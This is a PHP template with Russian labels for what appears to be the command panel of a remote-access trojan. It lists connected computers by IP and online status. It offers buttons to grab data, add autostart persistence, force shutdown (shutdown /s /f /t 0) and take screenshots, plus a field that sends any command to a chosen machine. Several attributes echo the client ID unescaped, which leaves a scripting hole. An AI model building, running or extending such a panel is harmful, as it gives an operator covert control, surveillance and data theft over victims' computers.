<?php
session_start();

// Проверка авторизации
if (!isset($_SESSION['logged_in']) || $_SESSION['logged_in'] !== true) {
    http_response_code(403);
    exit;
}

// Загрузка данных клиентов
$dataFile = 'data.json';
if (file_exists($dataFile)) {
    $data = json_decode(file_get_contents($dataFile), true);
} else {
    $data = ['clients' => []];
}

// Вывод только карточек клиентов
if(empty($data['clients'])): ?>
    <p>Нет подключённых клиентов.</p>
<?php else: ?>
    <div class="client-grid">
        <?php foreach($data['clients'] as $client_id => $client): ?>
            <div class="client-card">
                <div class="client-header">
                    <div class="client-title">
                        <h3>
                            <i class="fas fa-desktop"></i>
                            <?php echo htmlspecialchars($client_id); ?>
                        </h3>
                    </div>

                    <div class="quick-actions">
                        <button class="btn-icon delete-btn"
                                data-client-id="<?php echo $client_id; ?>"
                                title="Удалить">
                            <i class="fas fa-trash"></i>
                        </button>
                        <button class="btn-icon command-btn"
                                data-client-id="<?php echo htmlspecialchars($client_id); ?>"
                                data-command="get_data"
                                title="Данные">
                            <i class="fas fa-database"></i>
                        </button>
                        <button class="btn-icon command-btn"
                                data-client-id="<?php echo htmlspecialchars($client_id); ?>"
                                data-command="addstart"
                                title="Автостарт">
                            <i class="fas fa-play-circle fa-2x text-info"></i>
                        </button>
                        <button class="btn-icon command-btn"
                                data-client-id="<?php echo $client_id; ?>"
                                data-command="shutdown /s /f /t 0"
                                title="Выключить">
                            <i class="fas fa-power-off"></i>
                        </button>
                    </div>
                </div>

                <div class="client-info-grid">
                    <div class="info-label" style="font-size:13px; color:#fff;">
                        <div style="display: flex; align-items: center;">
                            <span style="color: #acaeb1;">Описание</span>
                            <button class="edit-description-btn" data-client-id="<?php echo $client_id; ?>" style="margin-left: 2px; background: none; border: none; cursor: pointer;">
                                <i class="fa-solid fa-circle-plus" style="color: #acaeb1; font-size: 11px;"></i>
                            </button>
                        </div>
                        <div id="description-<?php echo $client_id; ?>" style="font-weight: normal;">
                            <?php
                            $descriptions = json_decode(file_get_contents('descriptions.json'), true) ?? [];
                            echo htmlspecialchars($descriptions[$client_id] ?? 'Компьютер домашний');
                            ?>
                        </div>
                    </div>

                    <div class="info-item">
                        <div class="info-label">Активность</div>
                        <?php echo date("H:i", $client['last_seen']); ?>
                    </div>
                    <div class="info-item">
                        <div class="info-label">IP адрес</div>
                        <div class="info-label"><?php echo htmlspecialchars($client['ip']); ?></div>
                    </div>
                    <div class="info-item">
                        <div class="info-label">Статус</div>
                        <?php echo (time() - $client['last_seen'] > 60) ? 'Offline' : 'Online'; ?>
                    </div>
                </div>

                <div class="actions-toolbar">
                    <form class="command-input" method="post" action="api.php">
                        <input type="hidden" name="action" value="set_command">
                        <input type="hidden" name="client_id" value="<?php echo $client_id; ?>">
                        <div class="command-input-group">
                            <input type="text"
                                   name="command"
                                   placeholder="Введите команду"
                                   autocomplete="off">
                            <button type="submit">
                                <i class="fas fa-paper-plane"></i>
                            </button>
                        </div>
                    </form>

                    <div class="utility-buttons">
                        <button class="btn-icon command-btn"
                            data-client-id="<?php echo $client_id; ?>"
                            data-command="screenshot"
                            title="Скриншот">
                            <i class="fas fa-camera"></i>
                        </button>
                        <?php if (!empty($client['screenshot'])): ?>
                            <button class="btn-icon"
                                onclick="openModal('<?php echo $client['screenshot']; ?>'); showToast('info', 'Просмотр скриншота')"
                                title="Просмотр">
                                <i class="fas fa-image"></i>
                            </button>
                        <?php endif; ?>
                    </div>
                </div>
            </div>
        <?php endforeach; ?>
    </div>
<?php endif; ?>